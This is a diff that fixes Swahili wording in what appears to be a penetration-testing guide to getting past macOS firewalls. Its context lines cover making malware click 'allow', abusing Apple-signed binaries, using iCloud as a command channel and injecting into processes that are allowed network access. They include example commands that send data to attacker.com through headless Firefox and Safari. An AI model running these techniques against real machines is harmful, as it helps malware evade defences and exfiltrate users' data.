@@ -12,7 +12,7 @@ Mbinu zifuatazo zilipatikana zikifanya kazi katika baadhi ya programu za firewal
 
 ### Kibonyezi bandia
 
-- Ikiwa firewall inahitaji ruhusa kutoka kwa mtumiaji, fanya malware **ibonyeze ruhusu**
+- Ikiwa firewall inahitaji ruhusa kutoka kwa mtumiaji, fanya malware **ibonyeze ruhusa**
 
 ### **Tumia binaries zilizotiwa saini na Apple**
 
@@ -22,13 +22,13 @@ Mbinu zifuatazo zilipatikana zikifanya kazi katika baadhi ya programu za firewal
 
 Firewall inaweza kuwa inaruhusu muunganisho kwa tovuti maarufu za apple kama **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
 
-### Kupanua kwa jumla
+### Kupanua kwa ujumla
 
-Wazo kadhaa za kujaribu kupita firewall
+Wazo kadhaa za kujaribu kupita firewalls
 
 ### Angalia trafiki inayoruhusiwa
 
-Kujua trafiki inayoruhusiwa kutakusaidia kubaini tovuti zinazoweza kuwa kwenye orodha ya ruhusa au programu zipi zinazoruhusiwa kuziaccess.
+Kujua trafiki inayoruhusiwa kutakusaidia kubaini tovuti zinazoweza kuwa kwenye orodha ya ruhusa au programu zipi zimepewa ruhusa kuziaccess.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
@@ -61,7 +61,7 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Kupitia sindano za michakato
+### Kupitia sindano za mchakato
 
 Ikiwa unaweza **kushinikiza msimbo katika mchakato** ambao unaruhusiwa kuungana na seva yoyote unaweza kupita ulinzi wa firewall:
 
